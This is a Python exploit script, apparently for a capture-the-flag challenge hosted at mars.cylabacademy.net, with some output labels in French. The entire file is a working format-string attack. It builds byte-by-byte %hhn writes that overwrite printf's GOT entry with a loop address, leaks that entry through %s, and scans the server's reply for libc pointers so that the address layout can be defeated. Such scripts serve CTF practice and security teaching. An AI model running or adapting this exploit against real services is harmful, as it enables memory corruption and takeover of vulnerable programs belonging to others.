import sys, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929
PRINTF_GOT = 0x601030
LOOP = 0x4008be


def build(fmt_body, addrs):
    a = b"-1" + fmt_body
    pad = (8 - (len(a) % 8)) % 8
    a += b"P" * pad
    names_off = len(a)
    for ad in addrs:
        a += struct.pack("<Q", ad)
    pos = [10 + (names_off // 8) + i for i in range(len(addrs))]
    return a, pos


def make_fmt(dst, value, leak_addr=None, c0=21, nbytes=6):
    vals = [((value >> (8 * i)) & 0xFF, i) for i in range(nbytes)]
    order = sorted(vals)
    addrs = [dst + off for v, off in order]
    if leak_addr is not None:
        addrs.append(leak_addr)
    fmt = b""
    for i in range(len(order)):
        fmt += b"%99c%99$hhn"
    if leak_addr is not None:
        fmt += b"%99$s"
    a, pos = build(fmt, addrs)
    fmt = b""
    cur = c0
    for i, (v, off) in enumerate(order):
        need = (v - cur) % 256
        if need == 0:
            need = 256
        cur += need
        fmt += b"%" + str(need).encode() + b"c%" + str(pos[i]).encode() + b"$hhn"
    if leak_addr is not None:
        fmt += b"%" + str(pos[len(order)]).encode() + b"$s"
    a2, pos2 = build(fmt, addrs)
    return a2, pos2


a1, p1 = make_fmt(PRINTF_GOT, LOOP, leak_addr=PRINTF_GOT, c0=21)
print("fmt:", a1[:120])
s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(6)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(a1 + b"\n"); time.sleep(0.2)
s.sendall(b"1\n"); time.sleep(1.0)
buf = b""
try:
    while True:
        c = s.recv(1 << 16)
        if not c:
            break
        buf += c
except Exception:
    pass
print("recu:", len(buf))
print("=== 300 premiers octets ===")
print(repr(buf[:300]))
print("=== recherche 0x7f ===")
for i in range(len(buf) - 5):
    v = int.from_bytes(buf[i:i + 6], "little")
    if 0x7f0000000000 <= v <= 0x7fffffffffff:
        print("candidat a", i, hex(v), "->", buf[max(0, i - 30):i + 10])
        break
s.close()
